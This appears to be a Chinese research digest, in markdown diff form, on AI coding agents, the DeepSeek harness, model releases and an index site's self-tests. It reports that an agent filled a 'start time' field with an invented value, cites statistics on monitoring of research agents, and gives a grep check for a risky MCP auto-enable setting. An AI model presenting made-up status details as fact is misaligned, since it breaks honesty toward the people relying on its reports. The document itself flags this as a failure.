+https://juejin.cn/post/7665613563864530953 · 2026-07-23
+起源：**2025-02-02 Karpathy 发推 → 27,000+ 点赞 → 3-01 Merriam-Webster 收录**（不到 30 天进词典）；Replit CEO「约 75% 用户已这样编程」；**YC W25 中 25% 创业公司代码库 95% 由 AI 生成**。
+五条命题里最硬的两条：③ **隔离审查 —— 「产生代码的上下文，绝不能是审查代码的上下文」**；
+⑤ **上下文质量 > Prompt 质量 —— 「在 9,649 次对照实验中，上下文质量对输出质量的预测力强于 Prompt 质量；20 步的 Agent 会话中，坏的上下文会复利式恶化」**。
+数据：**71% 开发者试过、58% 团队纳入日常**；**有结构化规则的团队交付速度快 57%**；Veracode 2025：**AI 生成代码 45% 含安全漏洞**；GitClear 预测 **2027 年全球 AI 代码累积 $1.5T 技术债**。
+
+### 5.3 翻车实录：老板迷信 Claude Code 写 8000 行全 JSON 后端，导致生产崩溃（转载自 Linux.do）
+https://www.80aj.com/2026/07/14/vibe-coding-claude-code-fail · 2026-07-14
+**8000 行单文件 `server.py`**；**完全摒弃数据库与 Redis，改用本地 JSON 文件管理数据** → C 端多实例并发写入**缺乏锁与事务** → 数据写入冲突 → 系统崩溃。
+→ **参考。** 「**用 JSON 文件替代数据库处理并发**」是一个可写进 review 清单的**反模式标志**。
+
+### 5.4 方法论 + 对照实验：**有完整 AGENTS.md vs 没有，需人工修正的问题从七八处降到两处以内**（CSDN）
+https://blog.csdn.net/weixin_31412781/article/details/165142430 · 2026-09-12
+**「意图 CR」取代「代码 CR」** —— 评审重点从「代码有没有写错」变成「需求有没有被正确理解」；
+翻车三类：**没有明确验收标准 / 上下文陈旧的历史项目 / 过度依赖 AI 生成测试**（「它写的测试往往是实现细节复刻，实现一变就挂」→ **行为断言让 AI 写、场景与用例清单自己定**）；
+一个反直觉调整：**把 AI 补全从「自动连续」改成「手动触发」**，写核心逻辑时不会被带偏。
+→ **参考。** 「7-8 处 → 2 处以内」是 **AGENTS.md 价值的少数可量化证据**。
+
+### 5.5 官方/海外：「token 便宜到不值得计量」——**成本不该再是选型主轴**（GeekNews / Claude 日志）
+https://claude-news.today/en/briefings/briefing-2026-09-24 · 2026-09-24
+**「烧了多少 token」不再是关键，「能不能达到你要的质量线」才是**；按「够到你要的质量」去调档，而不是按「省 token」去调档。→ **落地（预算原则）。**
+
+### 5.6 海外：HN 当日第一名的「翻车实验」——**热评前十条全在骂落地页**（HN / Lobsters 日报）
+https://daily.steinslab.io/en/posts/vol-98-2026-09-19 · 2026-09-19
+OpenJev 冲到 **521 分**第一名，但**前十条热评没一条在讨论产品**。最高赞：**「一次性的 vibe-coded 站点永远是视觉灾难：无穷的填充文案、遍地陈词滥调、对可用性零关心。」**
+第二条比喻：像**「一个焦虑的学生写的学期论文 —— 该被编辑得聚焦清晰的地方，反而被反向编辑，拼命塞进多余细节」**。
+日报根因一句：**「这是一件成品」与「到底是谁做的」已经完全脱钩。**
+→ **落地（验收）。** 把「**去掉具体数字后这条还成立吗？**」加进我们的条目自检。
+
+### 5.7 海外：HN 350 分《How to Write with an LLM》——**「LLM 写出的段落对读者不算『写作』，算『输出』」**（HN）
+https://daily.steinslab.io/en/posts/vol-98-2026-09-19 · 2026-09-19（350 分 / 238 评论）
+反建议：「如果你是写给人类看的，就不要用 LLM。」同批还有「**GitHub wiki 是反模式**」—— 文档应放进与代码同版本的 `/docs`（可版本追溯、克隆即带上）。
+→ **落地（纪律）。** 索引站条目：**事实（URL/日期/数字）可由 AI 抽取，判断与取舍必须人写**；**不要建 wiki**（我们现在 `_r22/` + git 的做法有外部背书）。
+
+### 5.8 海外：当整个组织把 AI 输出叠在 AI 输出上（GeekNews / Claude 日志）
+https://claude-news.today/en/briefings/briefing-2026-09-24 · 2026-09-23
+一位**入职大公司两周**的开发者：环境里 Claude Code 生成一切（规格/代码/测试/需求/工单/报告），领导层不断催速度，
+而**开发者每天要指挥 AI 12~13 小时，正在被榨干**。
+→ **参考（红线）。** 记一条纪律：**每轮调研必须有「人工复核改掉/剔除」的记录**，否则就是「AI 叠 AI」。
+
+---
+
+## 六、DeepSeek harness（DSH）
+
+### 6.1 官方 release note：**v0.1.6-alpha.1 三件事一次改掉**（DeepSeek 官方）
+https://yage.ai/share/ai-news-weekly-boundaries-en-20260920.html · 2026-09-15（v0.1.7-rc.1 = 09-17）
+① **headless 会话续期**：新加「**adopt-only**」沿用标志 —— 可指定旧 session ID 续跑、用 stdin 继续喂任务、用 **NDJSON** 把运行事件实时回吐给监控脚本；
+**找不到 session ID / 工作目录不符 / 被别的进程锁住时快速失败，而不是悄悄开一个空白新会话**（避免流水线攒下无主状态）。
+② **SSH 远程工作区**：**协调器、API key、本地会话记录留在本机**，所有文件读写/命令执行走 SSH 到远程 POSIX 服务器，
+远程预装 **SHA-256 校验**的 helper；**SSH 掉线立即报错，不自动重连重放**。
+③ **PTC（模型写 TypeScript 批量调本地工具）从主进程 worker thread 移出**，改在**干净隔离子进程**里跑模型生成的代码。
+v0.1.7-rc.1 追加侧栏终端/网页/子代理、插件管理页、会话 pin/归档。
+→ **落地（观察）。** DSH 是我们的核心工具；「adopt-only 续会话 + 远端执行不自动重放」直接进 agent 编排规范。
+
+### 6.2 中文侧一手源码级拆解：**Cordis 地基 + 「观察等价 / 系统边界 / 作者义务」**（腾讯技术工程 · chino）
+https://www.163.com/dy/article/L4AHS9B70518R7MO.html · 2026-08-14
+- 地基是 **Cordis**（Shigma 的 Meta-Framework）：DSH 整套 **vendor 进自己仓库**、改名 `@deepseek-ai/cordis`，自家包全部设为它的 **peer dependency**。
+- 核心理论问题：**「有没有一种 programming model，能让动态本身具备类似进程那样的生命周期隔离？」**
+  → **时间可组合性**（卸载时对共享环境的修改必须被完整逆转）+ **空间可组合性**（依赖变化时相关组件自动激活/停用）。
+- **Fiber 六状态** `PENDING/LOADING/ACTIVE/FAILED/DISPOSED/UNLOADING`；**`ctx.effect()` 是唯一原语**，在已卸载 fiber 上建 effect 抛 `INACTIVE_EFFECT`。
+- **逆写得对不对怎么判？** 论文只要求**观察等价**（「两个状态相关，当没有任何观察者能区分它们」），并明确划**系统边界**：
+  边界内可 recover，**边界外（全局变量 / 公共文件 / 已发射数据）表现为 `idΓ`，既不追踪也不恢复**。
+- 诚实边界：**「回调提供了逆，但该逆是否真恢复了效应，是组件作者的责任（obligation），而不是运行时验证的性质（property）。」**
+- 与 Codex 的五处工程对比（循环可替换性 / 沙箱位置 / 拆包粒度 / 编排隔离 / 工具暴露方式）。
+
+→ **落地。** ① 借「观察等价」定义我们「记忆回滚 / 压缩可逆」的验收标准；② **边界外操作别再假装能回滚**（公共文件与已发出的消息）；
+③ `ctx.effect` 单一原语 + 时间强制，与 v21 的乐观锁 revision 互补。
+
+### 6.3 中文侧进度追报：怕浪猫「DSH 源码实战」专栏**已收官（第 16 章）**（掘金）
+https://juejin.cn/column/7675240621216923711 · 专栏 2026-08-18 创建，共 **18 篇**
+**第 16 章《构建你自己的 dsh 发行版 —— 从 profile 定制到生产部署》**（约 09-22，58 赞）·
+**第 14 章《子代理与工作流编排 —— agent 如何编排 agent》**（约 09-15，87 赞）·
+**第 13 章《沙箱与执行安全 —— 进程隔离策略与平台实现》**·
+另有**第 6 章《工具执行流水线 —— pre-execute 到 post-execute》**（`juejin.cn/post/7676324001992163347`）：
+`tool/call 事件 → tools/pre-execute(waterfall：hooks 拦截 / 权限 allow-deny-ask / 沙箱策略 / tool-jobs 检查) → 执行 → tools/post-execute`
+→ **落地。** 第 16 章是我们想复刻「一条命令起本地 agent」的最短路径；**13/14/16 三章正文列入 §十一 待追**。
+
+### 6.4 DSH 生态（GitHub 路，详见 `_r22/_r22_gh.md`）
+`ysr666/dsh-vision-router` ★1116（给纯文本 agent 装眼睛：免 key 视觉链 + 像素级工具 + OCR + 像素 diff，**一条命令装、无需 Python**）·
+`yyh-001/DSH-X` ★419（轻量启动器：版本切换 + 在系统浏览器里起 dsh web + 插件管理，Windows/macOS）·
+`Tyan66666/billion-context-dsh` ★107（**DSH 生态里唯一把上下文压缩做成一等公民的插件**：ACP = Active Context Pruning，
+后端 CompactionEngine，带 compress/decompress/search_context/acp_status 工具）·
+`Mars-Sea/dsh-commandcode-provider` ★319（接第三方模型网关的样板：实时模型目录、按套餐选模型、推理力度、多账号）·
+`Drhushi/dsh-plugin-tav2` ★22（**游戏本地化跟 AI 对话完成全流程，首发适配 Ren'Py**）。
+
+---
+
+## 七、模型测评与上新
+
+### 7.1 ⚠️ **AA Intelligence Index v4.3.2 换锚**：Elo 基准从「人类专家 1000」钉到「DeepSeek V4.1 Flash = 1600」
+https://muhammad-ahmed.com/blog/ai-brief-an-alpha-channel-and-a-licence · 2026-09-19（**第三方复盘，非 AA 公布**）
+**指数层面 145 个分数变动 / 128 个下降**；两天都有 GDPval-AA 分的 **233 个模型平均 Elo 掉 60.7、中位数 59.1**（177 降 / 4 升 / 52 个在地板）；
+只看 129 个「实测」模型**平均变化 −0.36、其中 126 个下降**；**56 个模型的取整显示分变了**（含 GPT-6 Astra extra-high effort 53 → 52）。
+公式公开：贡献值 `clamp((E−500)/2000)`、占 **10% 权重** → **1 个指数点 = 200 Elo**；锚点自身只降 32（说明**下半区被压缩**，钉在地板的从 52 增到 74）。
+**榜首差距（Fable 5.1 vs GPT-6 Astra）09-07 是 0.5597，09-19 变成 0.6813 —— 扩大 0.12 点，且没有任何新评测结果参与。**
+→ **落地（引用规范）。** 强制写「AA Intelligence Index **v4.3.2**，数据版本 **2026-09-19**」，并注明**不可与 v4.3.1 及更早横向比**。
+**这也是 M-0019「同一个数、不同口径」的最高级形态 —— 已回写进 `mistakes/M-0019`。**
+
+### 7.2 官方：**Qwen-Image-2.1 把许可证从 Apache-2.0 悄悄收成「仅非商业」**
+https://muhammad-ahmed.com/blog/ai-brief-an-alpha-channel-and-a-licence · 模型卡 2026-09-20
+2.1 换成 **Qwen Research License**（「for non-commercial purposes only」），**且限制延伸到「用它输出训练出来的模型」**。
+模型：总参 **16.22B**（Qwen3-VL 编码器 8.77B + 扩散 transformer 7.12B + 自编码器 0.34B）、**33.1 GB** 权重、无门禁；
+**发布帖里一个基准数字都没有**，独立评测者手工测 **7/15 通过**（上一版 4/15）；RTX 4090 int8 约 **5 秒**出 1MP，Q8 运行时占 **15,645 MB**。
+→ **参考（反面）。** 「开源」≠「可商用」；本地生成模型一律按 **许可证 + 是否可商用 + 输出能否再训练**三列登记。
+
+### 7.3 官方：Anthropic 首次公开**「前沿实验室内部 AI 研发进度」**指标 —— Claude 已主导自家约 26% 的研发
+https://www.claudenews.com.br/en-US/edicoes/147-2026-09-20 · 2026-09-17
+① **Claude 现在「主导」约 26% 的 Anthropic AI 研发**（2 月还不到 1%），**90% 以上任务的协作等级达「AI 协作」及以上**；
+② **约 30,000 个研究 agent 并发运行**，**在线监控器只拦下 0.002% 的 agent 决策**（**50 万次决策才拦 10 次** —— 可读成「可靠」，也可读成「拦得极少」）；
+③ **约 6% 的研发算力用于安全工作**（「AI 驱动的 AI 研发」子集里是 12%）。
+→ **参考。** 我们可照这个格式记三个数：**本辑 agent 产出条目数 / 人工复核改掉的条数 / 被去重闸门拦掉的条数**。
+
+### 7.4 官方：Anthropic 开「生命科学验证计划」——**把实时安全拦截换成离线用量监控**
+https://www.claudenews.com.br/en-US/edicoes/147-2026-09-20 · 2026-09-17
+beta，与美国政府共同开发：受审机构获 Standard / High-risk Use 授权后可**解锁默认被屏蔽的模型能力**，代价是**把实时拦截改成事后审计**。
+→ **参考。** **「默认拦死 + 白名单放行 + 事后审计」正在成为官方标准动作** —— 闸门不是「加得越多越安全」。
+
+### 7.5 开源：Cactus Needle 3 —— **8~29MB 的「只做工具调用」模型**，厂商说打平 DeepSeek V4 Flash、**独立测试只有 32.2%**
+https://byteiota.com/cactus-needle-3-8mb-on-device-ai-without-the-api-bill · 2026-09-17
+**单个 8~29MB 二进制 / 29M~121M 参数**，架构 Laddered Simple Attention Network（**大部分参数放在不耗算力的 engram n-gram 表里**
+—— 121M 参数按 ~50M 量算，**100 MFLOPs/token vs 296**）；权重压到约 **2 bit**；**输出被「从 schema 编译出的 byte-level 语法」约束，保证 JSON 一定可解析**；
+**没有工具匹配就返回空列表而不是瞎猜**。Mobile Actions 上 121M/2-bit 得 **86.0**，超过 LFM2.5 1.2B（82.4）、Qwen3.5 0.8B（76.0）；
+Raspberry Pi 5 上 **400~4,000 token/s**。
+⚠️ **反面**：「打平 DeepSeek V4 Flash」是**微调后的 4 层切片**在**只有 200 行**的 DroidCall 上；**一位开发者的独立测试把它测成 32.2%**；
+作者也直说「**它是任务专用的，上生产前通常需要微调**」；**工具超过约 10 个就退化**；HN 记录了一个失败：**「我的车撞了」触发了音乐播放**。
+→ **参考（观察）。** 「**小模型不该做成小号聊天机器人，而该做成一个专用组件**」正是 16GB 本机的方向：**路由/抽取用专用小模型，判断/写作才用大模型。**
+
+### 7.6 开源：Aikido 发布基于智谱 GLM 5.3 微调的**安全模型 Altar 1**（漏洞检测与安全向评审）
+https://www.explainx.ai/blog/aikido-altar-1-open-security-model-2026 · 2026-09-23
+定位：**让组织把代码与安全敏感产物留在自己可控的基础设施里本地跑**。行业简报把它作为「**开放权重生态从『发模型』转向『发领域专用、可部署的系统』**」的证据。
+→ **参考（候选）。** **安全模型的价值在「漏报率」而不在「看起来专业」** → 落地前必须**自己造一批已知有洞/无洞的样本去测**。
+
+### 7.7 中文侧发布资讯：**DeepSeek V4.1 Flash**（552B MoE / 输入输出不对称激活 / 下调定价）
+https://new.qq.com/rain/a/20260910A08B3O00 · 2026-09-10
+**552B 参数 MoE**、Causal-Encoder-Decoder 结构（**输入激活 8B、输出激活 16B**）、原生多模态；
+**KV Cache：对 HBM 需求降到上一代 1/4、对 SSD 降到 1/8；相对初代已缩小 437 倍**；
+API 模型名改为 **`deepseek-flash`**；**2026-09-14 12:00 后至 V4.1 Pro 上线前，`deepseek-v4-pro` 请求全部路由到 V4.1 Flash 并按 Flash 单价计费**；
+**仍采用峰谷定价（闲时为高峰半价）**。**腾讯（WorkBuddy、CodeBuddy）与 OpenCode 已全量接入。**
+→ **参考。** ⚠️ **继续用旧模型名 = 降级但更省** → 配置里要显式改成 `deepseek-flash` 才能拿到稳定语义。
+
+### 7.8 中文侧发布资讯：**智谱 GLM-5.3** 上线，AA 指数 **60 分**、与 Kimi K3 并列开源第一
+https://news.pconline.com.cn/2180/21805693.html · 2026-08-19
+**与上一代 GLM-5.2 同一基础模型，性能提升主要来自后训练**（「前沿能力向前推进不必依赖更大参数规模」），**实现前沿旗舰中最低的单任务成本**；**权重已开源**。
+→ **参考。** 「同基座、纯后训练提升」对 16GB 本机的启示：**后训练/微调可能比换更大基座更划算。**
+
+### 7.9 中文侧权威周报（**同时是判据修正线索**）：南方周末《AI 新模型四连发》第 35 期
+https://www.toutiao.com/article/7683040382200775231/ · 2026-09-08（覆盖 08-31~09-06）
+**9-01 Anthropic Fable 5.1** · **9-02 Gemini 3.8 Flash**（DeepSWE v1.1 **73.7%**，比 3.7 Flash 高约 8 个点）·
+**9-02 Meta Muse Spark 1.3**（编码任务**调用工具次数减少约 20%、token 使用减少约 25%**，增强提示注入防护）·
+**9-03 OpenAI GPT-6 Astra**（FrontierMath Tier 4 **97.6%**；**ARC-AGI-3 从 7.8% 跃升至 99.9%**，关键机制是 **Provider Adapter 框架**）。
+**南方周末主动补的诚实边界**：ARC Prize 指出 Astra **用标准测试框架只有 62.7%（成本约 2.61 万美元）**，
+**用 Provider Adapter 才到 99.9%（约 1.88 万美元）** —— 「高分仍严重依赖豪华外挂和昂贵算力」。
+→ **★ 这条推翻了第二十一辑的一处误判**（详见 §十）。
+
+### 7.10 中文侧日更情报源（逐条带原始来源，建议长期订阅）：英辰朗迪 AI 精选
+https://aibridge.blog.csdn.net/article/details/166195065 · 2026-09-21
+**上海 AI 实验室开源 Atria Dawn Preview**（基于 GLM-5.2 权重、**约 744B**、**MIT**，支持可验证工具调用）·
+**Gemini 3.8 Live**（9-15，实时语音 Agent 支持后台工具调用与并行推理，**支持 97 种语言**）·
+**GLM-5.3-FlashX**（9-18，**目标推理速度约 200 tokens/秒**）·
+**Qwen3.8-Omni-Flash**（9-18，**1M token 上下文、部分场景成本较此前下降超 93%**）·
+**MIRAGE 研究**（arXiv 2609.19059v1，9-17）：**开源权重模型在「上下文连续性」与「工具中介检索」上表现较弱**，
+**「仅看最终结果的评测会高估智能体能力」** · 算力：**华为昇腾 960 超节点**（算力卡 1024 → **4096 卡**、FP8 8 EFLOPS、HBM 1 PB）·
+**智谱 RSI 在 10 万张国产卡上用 GLM 造 GLM** · 移动云异构混合推理（DeepSeek V4 Flash 上调优，**推理输出与能效提升 1 倍以上、运营成本降低 40% 以上**）。
+→ **参考。** MIRAGE 那句直接支撑我们「看轨迹而非看结论」的评估取向。
+
+---
+
+## 八、一手源闭环 + 顺带查出的生态（主 agent 直查）
+
+### 8.1 ✅ **上轮待办 #1 闭环：追了两轮的《DeepSeek Harness：从开机到拆开》一手源找到了**
+https://github.com/alchaincyf/deepseek-harness-orange-book
+- `gh api` 实测：**★1302** · license 字段 `null`（正文声明 **CC BY-NC-SA 4.0**）· 建于 **2026-08-14** · updated **2026-09-24**。
+- README 关键事实（**官方自述**）：**DeepSeek agent harness 开源日 = 2026-08-13，MIT 许可**；
+  橙皮书在开源后 **24 小时内**写完，含**完整系统提示词**、**129 行默认启动清单**、**三份未编辑会话日志**、
+  **AI 给自己造工具的 19 步现场记录（工具清单 32 → 33 行）**、四种运行模式、技能与插件机制、代码库考古与事故复盘；
+  四大板块：入门指南 / 运行机制 / 技术地基 / 哲学反思；PDF / EPUB / HTML 免费下载。
+- 作者花叔（`alchaincyf`）：**小猫补光灯**（App Store 付费榜第一）作者、「橙皮书」系列作者、CCTV《焦点访谈》「手搓经济」代表、**自述从未手写过一行代码**。
+- ⚠️ **核实边界：README 自述已读，正文未逐页读** —— 标「官方自述」的字段不得当作实测证据引用。
+
+### 8.2 顺带查出的整个生态（14 个仓库，`gh api` 实测，**在 index.html 与 v19/v20/v21 全部零命中**）
+**已选 4 个进索引（见 §十）**：`darwin-skill` ★6086（**让 skill 自己进化：评估→改进→测试→保留或回滚**，正好对上我们「列出没被用过的 skill」这条待办）·
+`huashu-skills` ★1607（52 个 skill 总目录 + **机器可读 `skills.json`** + 安装协议 + 更新检查机制）·
+`huashu-report` ★422（**报告规范从 42 份采集 / 41 份进量化基线的真报告反向提炼**，6 种原型 + 8 种图表模式）·
+`deepseek-harness-orange-book` ★1302。
+**本辑未占名额、下轮优先**：`nuwa-skill` ★33169 · `huashu-design` ★24423（HTML 原生设计 skill，agent-agnostic）·
+`zhangxuefeng-skill` ★10327 · `hermes-agent-orange-book` ★4953 · `huasheng_editor` ★756 · `claude-code-orange-book` ★316 ·
+`karpathy-skill` ★304 · `deepseek-v4-deep-dive` ★280 · `3d-vibe-coding-handbook` ★264 · `deepseek-influence-report` ★31。
+⚠️ **共同待核**：这批仓库多为 08–09 月新建、★ 增长很快（`nuwa-skill` 3.3 万）→ **需要一次「是否真人关注」的核实**
+（看去重后的 fork/issue/PR 结构，而不是只看 ★）。**本辑未做，登记为待办。**
+
+---
+
+## 九、本辑自测与「有用就改」（读 → 核实 → **测试** → 才决定改不改）
+
+### 9.1 两条新闸门的自检各抓出**真缺陷**，其中一个会导致「假绿」
+| 闸门 | 抓出的缺陷 | 后果（若不修） |
 |---|---|---|
-| `kmvaidya/llm-arena-vram-calc` | **2★ / MIT / Python** | 把 Arena 榜与**参数量 + 各精度显存估算**交叉，回答"我的卡能跑哪个最强的模型"；**已计入 25% 服务开销**（KV cache + 激活 + 框架）。⚠️ 目标档位偏 H100/B200，**要自己加一档 12~16GB 消费卡** |
-| `yrougy/llm-quant-bench` | **10★ / 未声明 / HTML** | **专测"GGUF 量化档位损失多少精度"**：硬件就是 **2×RTX 3060 12G / GTX 1070 8G**、llama.cpp `llama-server`、KV cache q4_0、上下文 16384–32768。⚠️ 但 `license=null` |
-| `notwitcheer/llm-bench-rig` | **40★ / 未声明 / Python** | 双引擎（llama.cpp / vLLM）评测流水线；`board_ci.py` 出 **Wilson 95% 误差棒**（**让相邻名次可视为平手**）；每次运行写 **provenance**（server build + chat template hash + gguf sha256）供回溯。⚠️ **不依赖 lm-evaluation-harness**，生成式判定口径会与 loglikelihood 差几分；目标卡是 **RTX 5090 级** |
-| `AmigaMeow/llm-leaderboard-data` | **4★ / MIT / Python** | **每日自动更新**的榜数据（GitHub Action），聚合 LMArena + OpenRouter 定价，**同步镜像到 HF dataset 可 `load_dataset()`**。⚠️ README 自述 **Arena 分取自 2026-09-13 快照、此后上游未发新快照**，定价每日抓 → **看榜要分清哪个字段是陈旧的** |
+| `_tools/memory_health.py` **R7** | 只扫 `regressionTest` 的缩进块找 `stale: true`，遇到 **`regressionTest: \|` + 顶层 `stale:`** 会把已声明失效的条目标成 NOPATH | 一个已声明「我知道它失效了」的条目继续报红（假警） |
+| `_tools/arch_boundary_probe.py` | ① 提取出的行**带着 `+`/`-` 标记**，`^\s*def` 因此失配 → `def f(...)` 被当成「旧调用点被删」；② 同一原因让新增定义行被当成「新调用」 | **所有 Frankenstein 都被误判成 MIGRATION（假绿）** —— 闸门永远绿，比没有更危险 |
 
----
+→ **R7 有 `--selftest`（10 项正反例，其中 2 组是「上一版会误报」的回归位）；arch probe 有 4 组正反例。
+两个探针现在都能「自证可被反例证伪」。** 这是 M-0020 / M-0022 家族的第三次实操。
 
-## 九、GitHub 路其余条目（9 条，全量见 `_r21/_r21_gh.md`）
-
-| 项目 | 实测 | 可复用性 |
+### 9.2 上轮待办逐条对账（**做完的写完成时，没做完的写清为什么**）
+| # | 待办 | 结果 |
 |---|---|---|
-| `ShenSeanChen` 之外的 `hatayama/unity-cli-loop` 类**引擎 CLI 闭环**（`godot-mcp-cli` 同思路） | — | **参考**：看工具清单里有没有 **run / input / screenshot 三个动词** |
-| `IvanMurzak/GameDev-MCP-Server` | 13★ / Apache-2.0 / C# | **参考**：一个 server 二进制服务多引擎、能力由插件侧注入；实现过重 |
-| `estebanrfp/defold-ai`（**4★**）、`Lolner95/godotter`（**31★ / MIT**）、`cats2333/bevy_ai_editor`（**12★**） | — | **参考/不采用**：godotter 的"**先出计划 → 展示 diff → 用户批准才落盘**"护栏可抄；bevy 与 godot-mcp-pro 均 `license=null`/付费，**只能读不能抄** |
-| `helloHupc/dsh-plugin-hub` | **13★ / MIT / HTML** | **落地**：DSH 插件聚合索引站，合并 6 个数据源、**实测去重后 3700+ 条**、每小时刷新；`python3 scripts/aggregate.py` 一键 ETL + `--offline` 缓存调试 → **与"维护静态索引站 + 写 Python 脚本"画像完全对齐**，可直接抄流水线 |
-| `TecFancy/dsh-auth-gate` | **15★ / MIT / TS** | **落地**：给公开部署的 DSH Web 加"登录门"（密码/token + 可选 TOTP），**README 明确覆盖 Windows CI**。属"官方缺位期补丁"，升级 dsh 要跟着升 |
-| `RYun601/dsh-launcher` | **3★ / MIT / PowerShell** | **落地**：**Windows 专用** DSH Web 启动器，cmd 输入 `deepseek` 即启（`-b` 后台）、服务就绪自动开浏览器、`--status`/`--stop` |
-| `AI-Scarlett/DSH-Store` | 2★ / MIT / JS | **参考**：插件商城 + 生命周期管理，**Catalog 固定到完整 commit 才生成修复命令**。⚠️ README 提醒 `ERR_PNPM_GIT_DEP_PREPARE_NOT_ALLOWED` 时**别**放开整个 Profile 的 `prepare` 权限 |
-| `MingYU-kalo/dsh-https-fix` | 2★ / MIT / JS | **不采用（反例）**：给 dsh 安装目录的 `client.js` 打**运行时热补丁** → **dsh 一升级就被覆盖、装错版本直接起不来**；默认账密 `admin/admin` 而 agent 能本机执行命令 |
-| `jsflax/Engram` | 6★ / 未声明 / **Swift** | **不采用**：macOS 路线。**只抄它的节流设计** —— learner 同时只跑一个、10 分钟上限、每批 ≤12 次记忆调用/≤5 次写入、成功区间 checkpoint、失败保留游标并退避 5 分钟 |
+| 1 | 追花叔一手源 | ✅ **闭环**（§8.1） |
+| 2 | 架构边界闸门（Frankenstein，**欠两轮**） | ✅ **已建** `_tools/arch_boundary_probe.py`，自检 4/4；⚠️ **真实历史 0 命中**（见 9.3） |
+| 3 | `agent-house-rules.md` 294 行该砍 | ✅ **已砍到 192 行**（砍 24 条、留空号不复用、交叉引用不断） |
+| 4 | Foremerge 最小版 | ✅ **首次实操**，见 9.4 |
+| 5 | `memory_health.py` 加 R7 | ✅ 已落地（+ `--selftest`） |
+| 6 | 修 `mistakes/` 里 8 条失效回归测试路径 | ❌ **未复现**（勘误见 9.5）；另修了 2 条「一个字段塞多个目标」的 |
+| 7 | `mistakes/` 加「为什么」字段 + `content_sha256` | ⏳ 未做（本辑上下文不足，承接） |
+| 8 | 回注 token 预算 | ✅ 落地为 **R8**：工作区 MEMORY.md ≤3000 / 用户级 ≤2000（**绊线，非推导值**） |
+| 9 | `/skill-doctor` 式自查 | ⏳ **本辑查到更好的入口**：`alchaincyf/darwin-skill`（评估→改进→测试→回滚），下轮照它做 |
+| 10~16 | 承接老账（rpycdec 反编译自查、Codex 本地 config.yaml、DSH 上下文插件二轮评估、`check_rpy_branches.py`、AI 生成标记、词表、模型分档旋钮） | ⏳ 全部承接，见 §十一 |
 
-**许可风险清单**（**只能读、不能把代码/文字抄进项目**）：`license=null` 6 条（`bevy_ai_editor`、`skill-hook-authoring`、两个 `vibe-coding-security`、`llm-bench-rig`、`llm-quant-bench`）+ `NOASSERTION` 4 条（`godot-mcp-pro`、`defold-ai`、`agent-systems-handbook`、`Engram`）。**可安全抄用的 15 条。**
+### 9.3 ⚠️ 架构边界闸门的真实历史结果，以及由此发现的方法问题
+在 `amphoreus-roast` 最近 10 个提交上跑：**共享层签名变更 0 处**（只有 2 处 `DEAD` —— 单文件内部的工具函数改了参数）。
+**但这不代表「我们没犯过这个错」**：该仓库的历史是 **每轮 squash 成一个提交**（10 个提交 = 10 轮），
+**而 Frankenstein 效应的粒度正是「同一次提交内部」** —— **squash 会把要抓的东西压平。**
+→ 结论：**闸门本身是对的（4/4 反例通过），但它跑错了对象**；要用它必须**在提交之前跑、或保留未被 squash 的中间历史**。
+这条已写进 §十一。
 
----
+### 9.4 Foremerge 最小版首次实操：**有效，但暴露两个新问题**
+三路开工前各自在 `_r22/_r22_intent.md` 写下「我要查什么」（各 6~10 个关键词），收工前再读一次、把自己和别人撞的条目写进「交叉区」。
+- ✅ **结果**：三路**逐条说明了边界**（仓库 / 博客 / 官方三分栏；OpenCursor 归 gh 不归 official；安全扫描器 vs 翻车帖 vs 官方政策三层不重复），
+  **本辑没有出现两路收同一条的情况**。
+- ⚠️ **问题一**：三路是**并发**写的，「开工前先写」对**同时启动**的三路形同虚设 ——
+  cn 路声明了「花叔橙皮书一手源」，而**主 agent 同一时间已经自己查完了**（只能事后发消息叫它停）。
+  → **改进：意图文件要有「谁先写谁占位」的时间戳 + 主 agent 在派活前先把自己要做的写进去。**
+- ⚠️ **问题二**：gh 路自报「开工时间 2026-09-24 08:40」，而**实际开工是 15:31** ——
+  **模型自报的时间不可信**（模板要「开工时间」它就给了一个看起来合理的值）。
+  **凡「时间」字段，要么由脚本打时间戳，要么不写。**（与 M-0021「自述 ≠ 已落盘」同族。）
 
-## 十、本辑自测：读完了，**实测了什么，改了什么**
+### 9.5 勘误：上轮汇总说的「8 条回归测试路径失效」**没有复现**
+新写的 R7 在 22 条错误记忆上分类计数：**OK 20 / CONCEPT 2 / ARCHIVED 0 / MISSING 0**。
+即：**22 条里没有任何一条的 `regressionTest.path` 指向不存在的路径**（游戏仓库 `amphoreus-roast/` 及 `tools/*.py` 全都还在盘上）。
+→ 上轮那句「真正能跑的只有 6/22」**大概率说的是「命令跑不跑得起来」（缺 venv / 缺 renpy.exe），而不是「路径存不存在」** ——
+两件事被写成了一件事。**R7 只查存在性，这条边界已印在它的输出里**；
+「命令可跑性」作为**另一项检查**登记进 §十一。**房规 #49 里那行被推翻的实测数字也已就地更正。**
 
-> 规则：**有数字、有可复现机制的才落地**；实测不报红的不落地（宽判据的假警比没有更危险）；超上下文的写进待办。
-
-### 10.1 实测 ①：TrustFall 自查（对应 §6.1 + 房规 #48）
-`grep -rl "enableAllProjectMcpServers" D:\34498\Documents` + `Glob **/{.mcp.json,settings.json}` →
-**真实配置 0 命中**（唯一命中是本辑调研文件正文），`refs/` 下无 `.mcp.json`。
-→ **结论：当前无风险，但此前没有任何检测机制** → 落地为**房规 #48**（含检测器命令），把它从"运气好"变成"**可检查**"。
-
-### 10.2 实测 ②：记忆条目的回归测试**能不能真跑**（新发现）
-对 `mistakes/` 全部 22 条抓 `regressionTest.path` 并逐条验存在性：
-**真正可执行 6 条（27%）** / **路径已失效 8 条**（**全部指向已终止的游戏线 `amphoreus-roast/`**）/ 自然语言描述而非路径 6 条 / `n/a` 2 条。
-→ **失效的回归测试比没有更糟**：它看着像"这条有检测器"，按它跑只会报"文件不存在"（M-0002 复发）。
-→ 落地为**房规 #49**；并把 `memory_health.py` 的 **R7（字面路径存在性统计）** 列入待办（**没做**：改它要先读 8.7KB 脚本，本轮上下文不够，见待办第 6 条）。
-
-### 10.3 实测 ③：给新闸门做正负例 —— **连抓出自己三个坑**（已修）
-本辑新建 `_tools/index_metrics.py`（索引站口径对账），按 M-0022 的处方**先做负例再上生产**，结果：
-- 坑一：页头正则写成 `[0-9]{3,5}` —— **只认 4 位数的真实文件**，迷你样本"共 3 个项目"匹配不上 → 假警；
-- 坑二：探针只判退出码 → **E1 的假警被当成了 E2 的召回（假警伪装成召回）**；
-- 坑三：负对照分支的 `got` 语义**写反了**（`没报红` vs `报红了`）→ 合规样本被判假警。
